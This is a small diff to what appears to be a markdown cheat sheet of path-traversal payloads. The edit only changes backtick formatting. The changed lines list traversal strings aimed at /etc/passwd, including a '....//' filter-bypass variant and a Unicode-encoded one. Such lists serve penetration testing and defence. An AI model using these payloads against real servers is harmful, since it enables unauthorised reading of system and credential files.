@@ -909,8 +909,9 @@ If it does not work you can also add a ?, this way the rest will be interpreted 
 * normal
 `../../../../../../etc/passwd`
 `
-`....//....//....//....//....//etc/passwd`
+`....//....//....//....//....//etc/passwd
 `
+
 * with Unicode charecters
 `
 ..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8etc/passwd
